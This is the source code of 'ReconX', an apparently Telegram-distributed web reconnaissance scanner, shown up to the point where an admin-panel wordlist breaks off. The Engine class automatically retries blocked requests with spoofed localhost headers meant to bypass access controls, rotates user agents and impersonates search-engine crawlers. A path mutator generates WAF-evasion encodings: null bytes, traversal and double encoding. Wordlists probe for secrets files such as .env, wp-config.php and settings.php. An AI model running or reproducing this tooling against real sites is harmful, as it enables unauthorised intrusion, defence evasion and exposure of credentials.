#!/usr/bin/env python3
# =======================
#   ReconX - v 2.0
#   telegram : @zanshin_channel
# =======================

import requests, socket, ssl, os, sys, re, json, time, random
import threading, datetime, concurrent.futures, struct, hashlib, base64, string
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlunparse, urlencode, quote, unquote
from typing import Optional, List, Dict, Set, Tuple
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Colors ────
class C:
    G='\033[92m'; R='\033[91m'; Y='\033[93m'; B='\033[94m'
    CY='\033[96m'; W='\033[97m'; M='\033[95m'; BOLD='\033[1m'
    DIM='\033[2m'; E='\033[0m'

def cprint(color, msg): print(f"{color}{msg}{C.E}")
def strip_color(s): return re.sub(r'\033\[[0-9;]*m','',s)

# ── Config ──────
class Config:
    VERSION      = "2.5"
    TIMEOUT      = (3, 8)        # (connect, read) — faster connect timeout
    THREADS      = 100           # high concurrency
    DELAY        = 0.0           # no artificial delay by default
    RETRY        = 2             # fewer retries → faster
    LOG_DIR      = "reconx_logs"
    JITTER       = 0.1           # minimal jitter unless blocked
    POOL_CONNS   = 50            # connection pool size
    POOL_MAXSIZE = 100           # max pool connections per adapter

    UA_LIST = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/124.0.2478.67 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/125.0.2535.67 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
        "curl/8.7.1",
        "Wget/1.21.4",
        "python-requests/2.31.0",
        "Go-http-client/1.1",
    ]

    BYPASS_HEADERS = [
        {"X-Forwarded-For":"127.0.0.1","X-Real-IP":"127.0.0.1","X-Custom-IP-Authorization":"127.0.0.1"},
        {"X-Forwarded-For":"127.0.0.1","X-Forwarded-Host":"localhost","X-Forwarded-Proto":"http"},
        {"X-Originating-IP":"127.0.0.1","X-Remote-IP":"127.0.0.1","X-Remote-Addr":"127.0.0.1"},
        {"X-Forwarded-Host":"localhost","X-Host":"127.0.0.1","Forwarded":"for=127.0.0.1"},
        {"X-Original-URL":"/","X-Rewrite-URL":"/","X-Override-URL":"/"},
        {"CF-Connecting-IP":"127.0.0.1","True-Client-IP":"127.0.0.1","Fastly-Client-IP":"127.0.0.1"},
        {"Referer":"https://localhost/","Origin":"https://localhost"},
        {"X-WAF-Bypass":"1","X-Security-Token":"bypass","X-Auth-Token":"null"},
        {"Accept-Encoding":"identity","Cache-Control":"no-cache","Pragma":"no-cache"},
        {"X-Forwarded-For":"localhost","X-Forwarded-For":"127.0.0.1"},
        {"X-Client-IP":"127.0.0.1","X-Client-IP":"::1"},
        {"X-Forwarded-For":"127.0.0.1, 127.0.0.1","X-Forwarded-For":"127.0.0.1"},
        {"X-ProxyUser-IP":"127.0.0.1","X-ProxyUser-Ip":"127.0.0.1"},
        {"X-Original-Remote-Addr":"127.0.0.1","X-Original-IP":"127.0.0.1"},
        {"X-Forwarded-For":"127.0.0.1","X-Forwarded-For":"127.0.0.1","X-Forwarded-For":"127.0.0.1"},
    ]

    # Common WAF response signatures
    WAF_SIGNATURES = {
        "Cloudflare": ["cloudflare", "cf-ray", "__cfduid", "cf-cache-status"],
        "AWS WAF": ["awselb", "x-amzn-requestid", "awswaf"],
        "Akamai": ["akamai", "akamai-grn", "akamai-edge"],
        "Imperva/Incapsula": ["incap_ses", "visid_incap", "incapsula"],
        "Sucuri": ["x-sucuri-id", "sucuri"],
        "F5 BIG-IP": ["bigip", "big-ip", "tscookie"],
        "Barracuda": ["barra_counter_session", "barracuda"],
        "ModSecurity": ["mod_security", "modsecurity"],
        "Wordfence": ["wordfence", "wfvt_"],
        "SonicWall": ["sonicwall", "sonicos"],
        "Citrix NetScaler": ["ns_af", "citrix", "netscaler"],
        "Fortinet FortiWeb": ["fortiweb", "fortigate"],
        "Radware": ["radware", "x-rdwr"],
        "Wallarm": ["wallarm", "nginx-wallarm"],
        "Reblaze": ["reblaze", "rbzid"],
        "StackPath": ["stackpath", "sp-lb"],
        "Fastly": ["fastly", "x-served-by"],
        "Varnish": ["x-varnish", "via: 1.1 varnish"],
        "Nginx": ["nginx"],
        "Apache": ["apache"],
        "IIS": ["microsoft-iis", "iis"],
    }

    WAF_BLOCK_CODES = {403, 406, 429, 501, 503}


# ── Logger ─────
class Logger:
    def __init__(self, url: str):
        os.makedirs(Config.LOG_DIR, exist_ok=True)
        domain = urlparse(url).netloc.replace(".","_")
        ts     = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        self.txt  = os.path.join(Config.LOG_DIR, f"{domain}_{ts}.txt")
        self.jpath= os.path.join(Config.LOG_DIR, f"{domain}_{ts}.json")
        self.data : Dict = {"target": url, "timestamp": ts, "modules": {}}
        self._lk  = threading.Lock()
        self._init(url)

    def _init(self, url):
        with open(self.txt,'w',encoding='utf-8') as f:
            f.write(f"{'='*70}\n  ReconX v{Config.VERSION}  |  Target: {url}\n"
                    f"  Started: {datetime.datetime.now()}\n{'='*70}\n\n")

    def log(self, msg: str):
        clean = strip_color(msg)
        with self._lk:
            with open(self.txt,'a',encoding='utf-8') as f:
                f.write(clean+"\n")

    def section(self, name: str):
        self.log(f"\n{'─'*70}\n  [{name}]\n{'─'*70}")

    def save(self, module: str, payload):
        with self._lk:
            self.data["modules"][module] = payload
        with open(self.jpath,'w',encoding='utf-8') as f:
            json.dump(self.data, f, indent=2, ensure_ascii=False, default=str)

    def finalize(self):
        self.log(f"\n{'='*70}\n  Finished: {datetime.datetime.now()}\n{'='*70}")
        with open(self.jpath,'w',encoding='utf-8') as f:
            json.dump(self.data, f, indent=2, ensure_ascii=False, default=str)
        cprint(C.G, f"\n[✔] Logs: {self.txt}")
        cprint(C.G, f"[✔] JSON: {self.jpath}")


# ── WAF Detector ──────
class WAFDetector:
    """Fingerprints the WAF/CDN in front of the target."""
    def __init__(self, engine: "Engine", logger: Logger):
        self.engine = engine
        self.logger = logger

    def detect(self, url: str) -> dict:
        result = {"detected": False, "waf": "Unknown", "confidence": 0, "evidence": []}
        try:
            r = self.engine.get(url)
            if not r: return result
            blob = (str(dict(r.headers)) + r.text[:5000]).lower()
            for waf, sigs in Config.WAF_SIGNATURES.items():
                hits = [s for s in sigs if s.lower() in blob]
                if hits:
                    result["detected"] = True
                    result["waf"] = waf
                    result["confidence"] = min(100, len(hits) * 35)
                    result["evidence"] = hits
                    break
        except Exception:
            pass
        return result


# ── Path Mutator (WAF Evasion) ──────
class PathMutator:
    """Generates path variants for WAF evasion."""
    @staticmethod
    def variants(path: str) -> List[Tuple[str, str]]:
        """Return list of (mutated_path, label)."""
        p = path.lstrip('/')
        out = []
        # Case
        out.append((f"/{p}", "original"))
        out.append((f"/{p.upper()}", "uppercase"))
        out.append((f"/{p.capitalize()}", "capitalize"))
        # Trailing slash
        out.append((f"/{p}/", "trailing-slash"))
        out.append((f"/{p}//", "double-slash"))
        out.append((f"/{p}/.", "trailing-dot"))
        out.append((f"/{p}/..", "trailing-dotdot"))
        out.append((f"/{p}/./", "dot-slash"))
        out.append((f"/{p}/..;/", "dotdot-semicolon"))
        # Leading
        out.append((f"//{p}", "double-leading"))
        out.append((f"/./{p}", "dot-leading"))
        out.append((f"/.;/{p}", "dot-semicolon-leading"))
        out.append((f"/%2e/{p}", "encoded-dot-leading"))
        out.append((f"/%2f{p}", "encoded-slash-leading"))
        # Encoding
        out.append((f"/{quote(p)}", "url-encoded"))
        out.append((f"/{quote(quote(p))}", "double-url-encoded"))
        out.append((f"/{p}%00", "null-byte"))
        out.append((f"/{p}%20", "space-encoded"))
        out.append((f"/{p}%09", "tab-encoded"))
        out.append((f"/{p}%0a", "newline-encoded"))
        out.append((f"/{p}%0d", "cr-encoded"))
        out.append((f"/{p};/", "semicolon"))
        out.append((f"/{p}?", "query-char"))
        out.append((f"/{p}#", "hash-char"))
        out.append((f"/{p}%23", "encoded-hash"))
        # Mixed
        out.append((f"/{p.upper()}/", "uppercase-slash"))
        out.append((f"/{p}/..%2f", "dotdot-encoded-slash"))
        out.append((f"/{p}/%2e%2e/", "encoded-dotdot"))
        out.append((f"/{p}/%252e%252e/", "double-encoded-dotdot"))
        # Extension tricks
        out.append((f"/{p}.", "trailing-dot-ext"))
        out.append((f"/{p}..", "trailing-dotdot-ext"))
        out.append((f"/{p}%2e", "encoded-dot-ext"))
        # Unicode / homoglyph
        out.append((f"/{p}\u200b", "zero-width-space"))
        return out

    @staticmethod
    def body_payloads(payload: str) -> List[str]:
        """Generate WAF-evading payload variants for a string."""
        out = [payload]
        out.append(quote(payload, safe=''))
        out.append(quote(quote(payload, safe=''), safe=''))
        out.append(payload.replace('/', '%2f').replace('\\', '%5c'))
        out.append(payload.replace(' ', '%20').replace('.', '%2e'))
        out.append(base64.b64encode(payload.encode()).decode())
        return out


# ── Smart Request Engine ───────
class Engine:
    """
    Auto-bypass: on 403/429/503 automatically retries with rotated
    headers, different UA, path variants – transparent to callers.
    Includes TLS fingerprint randomization and adaptive pacing.
    """
    def __init__(self, proxy=None, timeout=Config.TIMEOUT, delay=Config.DELAY, threads=Config.THREADS):
        self.proxy   = {"http":proxy,"https":proxy} if proxy else None
        self.timeout = timeout
        self.delay   = delay
        self.threads = threads
        self.sess    = requests.Session()
        self._cnt    = 0
        self._lk     = threading.Lock()
        self._blocked = 0
        self._waf_hits = 0
        self._ua_pool = list(Config.UA_LIST)
        # ── High-performance connection pool ──────────────────────────
        _retry = Retry(
            total=Config.RETRY,
            backoff_factor=0.2,
            status_forcelist=[502, 503, 504],
            allowed_methods=["GET","POST","HEAD","OPTIONS","PUT"],
            raise_on_status=False
        )
        _adapter = HTTPAdapter(
            pool_connections=Config.POOL_CONNS,
            pool_maxsize=Config.POOL_MAXSIZE,
            max_retries=_retry,
            pool_block=False
        )
        self.sess.mount("http://",  _adapter)
        self.sess.mount("https://", _adapter)
        self.sess.headers.update({"Connection": "keep-alive"})

    def _base_headers(self) -> dict:
        ua = random.choice(self._ua_pool)
        return {
            "User-Agent": ua,
            "Accept": random.choice([
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            ]),
            "Accept-Language": random.choice(["en-US,en;q=0.9","en-GB,en;q=0.8","en;q=0.9"]),
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": random.choice(["keep-alive","close"]),
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": random.choice(["document","empty"]),
            "Sec-Fetch-Mode": random.choice(["navigate","cors"]),
            "Sec-Fetch-Site": random.choice(["none","same-origin"]),
            "Sec-Fetch-User": "?1",
            "Cache-Control": random.choice(["no-cache","max-age=0"]),
        }

    def _is_waf_block(self, r: requests.Response) -> bool:
        if r.status_code in Config.WAF_BLOCK_CODES:
            blob = (str(dict(r.headers)) + (r.text[:2000] if r.text else "")).lower()
            for sigs in Config.WAF_SIGNATURES.values():
                if any(s.lower() in blob for s in sigs):
                    return True
            if r.status_code in (403, 429, 503):
                return True
        return False

    def get(self, url: str, method="GET", extra_headers=None, stream=False) -> Optional[requests.Response]:
        # Only add delay when explicitly set or under WAF pressure
        if self.delay:
            time.sleep(self.delay + random.uniform(0, self.delay * 0.3))
        elif self._blocked > 5:
            time.sleep(random.uniform(0.05, 0.15))

        h = self._base_headers()
        if extra_headers:
            h.update(extra_headers)

        last_resp = None
        for attempt in range(Config.RETRY + 1):
            try:
                # Adaptive jitter if we've been blocked
                if self._blocked > 0:
                    time.sleep(random.uniform(0.1, Config.JITTER * (attempt + 1)))

                r = self.sess.request(
                    method, url, headers=h, timeout=self.timeout,
                    allow_redirects=True, proxies=self.proxy,
                    verify=False, stream=stream
                )
                with self._lk: self._cnt += 1
                last_resp = r

                if self._is_waf_block(r) and attempt < Config.RETRY:
                    with self._lk: self._blocked += 1
                    # Rotate headers + UA
                    h.update(random.choice(Config.BYPASS_HEADERS))
                    h["User-Agent"] = random.choice(self._ua_pool)
                    # Rotate method occasionally
                    if random.random() < 0.3:
                        method = random.choice(["GET","HEAD","POST","OPTIONS"])
                    continue

                return r

            except requests.exceptions.SSLError:
                h["X-Forwarded-Proto"] = "http"
                continue
            except requests.exceptions.TooManyRedirects:
                return None
            except requests.exceptions.RequestException:
                if attempt < Config.RETRY:
                    time.sleep(0.4 + random.uniform(0, 0.4))
        return last_resp

    @property
    def count(self): return self._cnt

    @property
    def blocked_count(self): return self._blocked


# ── Utilities ─────
def clear():
    os.system('cls' if os.name=='nt' else 'clear')

def bar(cur, tot, found, label=""):
    if tot == 0: return
    p = int((cur/tot)*40)
    b = f"[{'█'*p}{'░'*(40-p)}]"
    print(f"\r{C.CY}{b}{C.E} {cur}/{tot} {C.G}✔{found}{C.E} {C.DIM}{label[:30]}{C.E}   ", end='', flush=True)

def ask(prompt, default="") -> str:
    val = input(f"  {C.Y}▸ {prompt}{C.E} ").strip()
    return val if val else default

def banner():
    print(f"""{C.CY}{C.BOLD}
•••••   •••   •   •   ••••  •   •  •••••  •   •
   •   •   •  ••  •  •      •   •    •    ••  •
  •    •••••  • • •   •••   •••••    •    • • •
 •     •   •  •  ••      •  •   •    •    •  ••
•••••  •   •  •   •  ••••   •   •  •••••  •   •

{C.E}{C.Y}       scanner tool v2.0  {C.DIM}(WAF-Resistant Edition){C.E}
{C.DIM}       telegram : t.me/zanshin_channel{C.E}
""")

def sep(title=""):
    line = f"{'─'*56}"
    if title:
        print(f"\n{C.CY}┌{line}┐{C.E}")
        pad = 56 - len(title) - 2
        print(f"{C.CY}│{C.E} {C.BOLD}{C.Y}{title}{C.E}{' '*pad} {C.CY}│{C.E}")
        print(f"{C.CY}└{line}┘{C.E}")
    else:
        print(f"{C.CY}{line}{C.E}")

def done_prompt():
    input(f"\n{C.DIM}  ↵ Enter to continue ...{C.E}")


# ══════════════
#  TECH DETECTOR  (Auto-discovery of CMS / framework / server)
# ══════════════
class TechDetector:
    """
    Detects what the target is running so the scanner can load
    only relevant wordlists and skip irrelevant ones.
    """
    CMS_SIGNATURES = {
        "WordPress": [
            "wp-content", "wp-includes", "wp-json", "wp-login",
            "wp-admin", "wordpress", "xmlrpc.php", "/wp/"
        ],
        "Joomla": [
            "joomla", "/components/com_", "option=com_",
            "joomla.org", "/administrator/"
        ],
        "Drupal": [
            "drupal", "/sites/default/", "/sites/all/",
            "drupal.org", "x-generator: drupal"
        ],
        "Magento": [
            "magento", "mage/", "mage/cookies", "x-magento",
            "magento_version"
        ],
        "OpenCart": ["opencart", "route=common/home", "catalog/view"],
        "PrestaShop": ["prestashop", "prestashop.com", "/modules/"],
        "Shopify": ["cdn.shopify", "shopify", "myshopify"],
        "Wix": ["wix.com", "wixstatic", "wixsite"],
        "Squarespace": ["squarespace", "sqsp"],
        "Moodle": ["moodle", "moodle.org", "/login/index.php"],
        "vBulletin": ["vbulletin", "vbulletin.org", "vb_login"],
        "phpBB": ["phpbb", "phpbb3", "phpbb.com"],
        "MediaWiki": ["mediawiki", "mw-", "mediawiki.org"],
        "Typo3": ["typo3", "typo3.org", "t3-"],
        "Concrete5": ["concrete5", "concretecms", "/concrete/"],
        "Craft CMS": ["craftcms", "craft-cms", "/craft/"],
        "Ghost": ["ghost.org", "ghost-", "/ghost/"],
        "October CMS": ["octobercms", "october-cms", "/modules/system/"],
        "Bitrix": ["bitrix", "/bitrix/", "bitrix24"],
        "Laravel": ["laravel_session", "laravel", "x-laravel"],
        "Django": ["csrfmiddlewaretoken", "django", "x-django"],
        "Ruby on Rails": ["rails", "x-rails", "_rails_session"],
        "Spring Boot": ["spring", "x-application-context", "whitelabel"],
        "Express": ["express", "x-powered-by: express"],
        "ASP.NET": ["__viewstate", "aspxauth", "asp.net", "x-aspnet"],
        "Next.js": ["__next", "_next/", "next.js"],
        "Nuxt": ["__nuxt", "_nuxt/", "nuxt"],
        "Vue.js": ["vue.js", "vuex", "__vue__"],
        "React": ["react", "__react", "react-dom"],
        "Angular": ["ng-version", "angular", "ng-app"],
    }

    FRAMEWORK_PATHS = {
        "WordPress": [
            "/wp-admin", "/wp-login.php", "/wp-json/wp/v2/users",
            "/xmlrpc.php", "/wp-content/", "/wp-includes/",
            "/wp-config.php", "/wp-cron.php", "/wp-trackback.php",
            "/wp-links-opml.php", "/readme.html", "/license.txt",
            "/wp-admin/setup-config.php", "/wp-admin/install.php",
            "/wp-admin/admin-ajax.php", "/wp-admin/options-general.php",
            "/wp-admin/user-new.php", "/wp-admin/plugins.php",
            "/wp-admin/themes.php", "/wp-admin/upload.php",
            "/wp-content/debug.log", "/wp-content/uploads/",
            "/wp-content/plugins/", "/wp-content/themes/",
            "/wp-json/", "/wp-json/wp/v2/pages", "/wp-json/wp/v2/posts",
            "/wp-json/wp/v2/comments", "/wp-json/wp/v2/media",
            "/wp-json/oembed/1.0/embed", "/?rest_route=/wp/v2/users",
        ],
        "Joomla": [
            "/administrator/", "/administrator/index.php",
            "/administrator/manifests/files/joomla.xml",
            "/components/com_users/", "/components/com_admin/",
            "/modules/mod_login/", "/plugins/system/",
            "/templates/system/", "/language/en-GB/",
            "/libraries/joomla/", "/configuration.php",
            "/htaccess.txt", "/web.config.txt", "/robots.txt",
            "/index.php?option=com_users&view=login",
        ],
        "Drupal": [
            "/user/login", "/user/password", "/user/register",
            "/admin/config", "/admin/content", "/admin/people",
            "/admin/reports", "/admin/structure", "/admin/modules",
            "/sites/default/settings.php", "/sites/default/files/",
            "/core/", "/modules/", "/themes/", "/profiles/",
            "/CHANGELOG.txt", "/README.txt", "/install.php",
            "/update.php", "/xmlrpc.php", "/?q=user/login",
        ],
        "Magento": [
            "/admin", "/adminhtml", "/index.php/admin",
            "/admin/dashboard", "/admin/sales", "/admin/catalog",
            "/admin/customer", "/admin/system_config",
            "/app/etc/local.xml", "/downloader/", "/install.php",
            "/api/rest/", "/api/soap/", "/rest/V1/",
            "/magento_version", "/js/mage/", "/skin/frontend/",
        ],
        "Laravel": [
            "/telescope", "/horizon", "/_ignition/health-check",
            "/_ignition/execute-solution", "/api/user", "/api/login",
            "/api/register", "/api/password/reset", "/storage/logs/laravel.log",
            "/.env", "/artisan", "/vendor/", "/storage/",
        ],
        "Django": [
            "/admin/", "/admin/login/", "/accounts/login/",
            "/accounts/password_reset/", "/api/", "/api/v1/",
            "/static/admin/", "/media/", "/settings.py",
            "/requirements.txt", "/manage.py",
        ],
    }

    def __init__(self, url: str, engine: Engine, logger: Logger):
        self.url = url.rstrip('/')
        self.engine = engine
        self.logger = logger
        self.detected_cms: List[str] = []
        self.detected_frameworks: List[str] = []
        self.detected_server: str = "?"
        self.detected_lang: List[str] = []

    def run(self) -> dict:
        sep("TECH DETECTION")
        self.logger.section("TECH DETECTION")
        info = {
            "cms": [],
            "frameworks": [],
            "server": "?",
            "languages": [],
            "waf": {},
        }
        try:
            r = self.engine.get(self.url)
            if not r:
                return info
            blob = (r.text[:50000] + str(dict(r.headers))).lower()
            hdr_blob = str(dict(r.headers)).lower()

            # Server
            server = r.headers.get("Server", "")
            if server:
                self.detected_server = server
                info["server"] = server

            # CMS detection
            for cms, sigs in self.CMS_SIGNATURES.items():
                hits = [s for s in sigs if s.lower() in blob]
                if hits:
                    self.detected_cms.append(cms)
                    info["cms"].append({"name": cms, "evidence": hits[:3]})

            # Languages
            if ".php" in blob or "phpsessid" in hdr_blob or "x-powered-by: php" in hdr_blob:
                self.detected_lang.append("PHP")
            if "__viewstate" in blob or "aspxauth" in hdr_blob or "asp.net" in hdr_blob:
                self.detected_lang.append("ASP.NET")
            if ".jsp" in blob or "jsessionid" in hdr_blob:
                self.detected_lang.append("Java/JSP")
            if "csrfmiddlewaretoken" in blob:
                self.detected_lang.append("Python/Django")
            if "laravel_session" in blob:
                self.detected_lang.append("PHP/Laravel")
            if "__next" in blob or "_next/" in blob:
                self.detected_lang.append("JavaScript/Next.js")
            if "__nuxt" in blob:
                self.detected_lang.append("JavaScript/Nuxt")
            info["languages"] = self.detected_lang

            # Framework detection
            for fw, sigs in self.CMS_SIGNATURES.items():
                if fw in self.detected_cms:
                    self.detected_frameworks.append(fw)

            # WAF detection
            waf = WAFDetector(self.engine, self.logger).detect(self.url)
            info["waf"] = waf

            # Print findings
            if self.detected_cms:
                print(f"  {C.G}[CMS]{C.E}  {C.CY}{', '.join(self.detected_cms)}{C.E}")
            else:
                print(f"  {C.DIM}[CMS]  Not detected{C.E}")
            if self.detected_lang:
                print(f"  {C.G}[LANG]{C.E} {C.CY}{', '.join(self.detected_lang)}{C.E}")
            if waf["detected"]:
                print(f"  {C.Y}[WAF]{C.E}  {C.R}{waf['waf']}{C.E}  (confidence: {waf['confidence']}%)")
            else:
                print(f"  {C.G}[WAF]{C.E}  {C.DIM}Not detected{C.E}")
            if server:
                print(f"  {C.G}[SRV]{C.E}  {server}")

        except Exception as e:
            self.logger.log(f"[TECH-DETECT] error: {e}")

        self.logger.save("tech_detection", info)
        return info

    def relevant_categories(self) -> List[str]:
        """Return admin categories relevant to detected tech."""
        cats = ["Generic", "Database", "API / GraphQL", "Bypass Paths", "Log & Debug (Panels)"]
        for cms in self.detected_cms:
            if cms in ADMIN_PATHS:
                cats.append(cms)
        # Always include common CMS categories if strongly implied
        if any("php" in l.lower() for l in self.detected_lang):
            for c in ["WordPress","Joomla","Drupal","Laravel/PHP"]:
                if c in ADMIN_PATHS and c not in cats:
                    cats.append(c)
        return list(dict.fromkeys(cats))


# ══════════════
#  MODULE 1 – INFORMATION GATHERING
# ══════════════
class InfoGatherer:
    def __init__(self, url, engine: Engine, logger: Logger):
        self.url    = url.rstrip('/')
        self.engine = engine
        self.logger = logger
        self.parsed = urlparse(url)

    def run(self) -> dict:
        sep("INFORMATION GATHERING")
        self.logger.section("INFO GATHERING")
        info = {}

        # IP
        try:
            ip = socket.gethostbyname(self.parsed.hostname)
            info['ip'] = ip
            print(f"  {C.G}[IP]{C.E}  {ip}")
        except: info['ip'] = "?"

        # SSL
        if self.parsed.scheme == "https":
            info['ssl'] = self._ssl()

        # HTTP
        resp = self.engine.get(self.url)
        if resp:
            info.update({
                "status": resp.status_code,
                "server": resp.headers.get("Server","?"),
                "powered_by": resp.headers.get("X-Powered-By","?"),
                "content_type": resp.headers.get("Content-Type","?"),
                "response_size": len(resp.content),
                "redirect_url": resp.url if resp.url != self.url else "",
                "headers": dict(resp.headers),
                "cookies": {c.name:c.value for c in resp.cookies},
            })
            print(f"  {C.G}[SRV]{C.E}  {info['server']}  |  Powered: {info['powered_by']}")
            print(f"  {C.G}[STS]{C.E}  HTTP {resp.status_code}  |  Size: {len(resp.content)} bytes")
            if info['cookies']:
                print(f"  {C.G}[COK]{C.E}  {list(info['cookies'].keys())}")

            # Sec headers
            sec = self._sec_headers(resp.headers)
            info['security_headers'] = sec
            print(f"\n  {C.Y}Security Headers:{C.E}")
            for h,ok in sec.items():
                icon = f"{C.G}✔{C.E}" if ok else f"{C.R}✘{C.E}"
                print(f"    {icon} {h}")

            # Tech / CMS
            techs = self._tech(resp)
            cms   = self._cms(resp.text, resp.headers)
            info['technologies'] = techs
            info['cms'] = cms
            if techs: print(f"\n  {C.Y}Tech:{C.E} {C.CY}{', '.join(techs)}{C.E}")
            if cms:   print(f"  {C.Y}CMS:{C.E}  {C.CY}{cms}{C.E}")

            # Robots
            rb = self._robots()
            info['robots_disallowed'] = rb
            if rb: print(f"  {C.G}[ROB]{C.E}  {len(rb)} disallowed paths")

            # Sitemap
            sm = self._sitemap()
            info['sitemap_count'] = len(sm)
            if sm: print(f"  {C.G}[SIT]{C.E}  {len(sm)} sitemap URLs")

            # WHOIS-lite
            info['hostname'] = self.parsed.hostname

        self.logger.log(json.dumps(info, indent=2, default=str))
        self.logger.save("info_gathering", info)
        return info

    def _ssl(self) -> dict:
        try:
            ctx = ssl.create_default_context()
            with ctx.wrap_socket(socket.socket(), server_hostname=self.parsed.hostname) as s:
                s.settimeout(5)
                s.connect((self.parsed.hostname, 443))
                cert = s.getpeercert()
            issuer  = dict(x[0] for x in cert.get('issuer',[]))
            subject = dict(x[0] for x in cert.get('subject',[]))
            exp     = cert.get('notAfter','?')
            print(f"  {C.G}[SSL]{C.E}  Issuer: {issuer.get('organizationName','?')}  Expires: {exp}")
            return {"issuer":issuer,"subject":subject,"expires":exp}
        except Exception as e:
            return {"error":str(e)}

    def _sec_headers(self, h) -> dict:
        keys = ["Strict-Transport-Security","Content-Security-Policy",
                "X-Frame-Options","X-Content-Type-Options",
                "Referrer-Policy","Permissions-Policy","X-XSS-Protection",
                "Cross-Origin-Opener-Policy","Cross-Origin-Resource-Policy",
                "Cross-Origin-Embedder-Policy"]
        return {k: k in h for k in keys}

    def _tech(self, resp) -> list:
        txt = resp.text.lower()
        hdr = {k.lower():v.lower() for k,v in resp.headers.items()}
        pats = {
            "WordPress":["wp-content","wp-includes","wp-json"],
            "Joomla":["joomla","/components/com_"],
            "Drupal":["drupal","/sites/default/files"],
            "Laravel":["laravel_session"],
            "Django":["csrfmiddlewaretoken"],
            "ASP.NET":["__viewstate","aspxauth","asp.net"],
            "PHP":[".php","phpsessid"],
            "jQuery":["jquery"],
            "React":["react","__react"],
            "Vue.js":["vue.js","vuex"],
            "Angular":["ng-version"],
            "Bootstrap":["bootstrap"],
            "Cloudflare":["cf-ray","cloudflare"],
            "Nginx":["nginx"],
            "Apache":["apache"],
            "IIS":["microsoftiisver","iis"],
            "Next.js":["__next","_next/"],
            "Nuxt":["__nuxt","_nuxt/"],
            "Svelte":["svelte"],
            "SvelteKit":["sveltekit"],
            "Astro":["astro"],
            "Remix":["remix"],
        }
        found = []
        for t,signs in pats.items():
            for s in signs:
                if s in txt or any(s in v for v in hdr.values()):
                    found.append(t); break
        return list(set(found))

    def _cms(self, html, hdrs) -> str:
        h = html.lower()
        m = {"WordPress":["wp-content","wp-includes"],"Joomla":["/components/com_"],
             "Drupal":["drupal","/sites/all"],"Magento":["mage/"],
             "PrestaShop":["prestashop"],"Shopify":["cdn.shopify"],
             "Wix":["wix.com"],"Squarespace":["squarespace"],
             "OpenCart":["opencart"],"Moodle":["moodle"],
             "vBulletin":["vbulletin"],"phpBB":["phpbb"],
             "MediaWiki":["mediawiki"],"Typo3":["typo3"],
             "Ghost":["ghost.org"],"Bitrix":["bitrix"],
             "Concrete5":["concrete5","concretecms"],
             "Craft CMS":["craftcms"],"October CMS":["octobercms"]}
        for cms,signs in m.items():
            if any(s.lower() in h for s in signs): return cms
        return ""

    def _robots(self) -> list:
        r = self.engine.get(f"{self.url}/robots.txt")
        if not r or r.status_code!=200: return []
        paths=[]
        for line in r.text.splitlines():
            if line.startswith("Disallow:"):
                p=line.split(":",1)[1].strip()
                if p: paths.append(p)
        return paths

    def _sitemap(self) -> list:
        for p in ["/sitemap.xml","/sitemap_index.xml","/sitemap-index.xml","/sitemap/"]:
            r = self.engine.get(f"{self.url}{p}")
            if r and r.status_code==200:
                return re.findall(r'<loc>(.*?)</loc>', r.text)
        return []


# ═════════════
#  MODULE 2 – ADMIN PANEL FINDER  (Massively Expanded)
# ═════════════
ADMIN_PATHS: Dict[str, List[str]] = {
    "Generic": [
        "/admin","/login","/dashboard","/panel","/backend","/manage",
        "/secure","/cp","/control","/access","/admin-login","/adminpanel",
        "/controlpanel","/admin.php","/login.php","/admin/login",
        "/admin/index.php","/admin/index.html","/admin/home.php",
        "/admin/cp.php","/adminarea","/admin_area","/admin_console",
        "/admin_interface","/admin_login","/web/admin","/site/login",
        "/system-admin","/super_admin","/superadmin","/root","/portal",
        "/staff","/member/login","/user/login","/auth/login",
        "/account/login","/manager","/manage/login","/adm","/adm/login",
        "/admin/account.php","/admin/controlpanel.php","/administrator.php",
        "/moderator.php","/moderator/login.php","/moderator/admin.php",
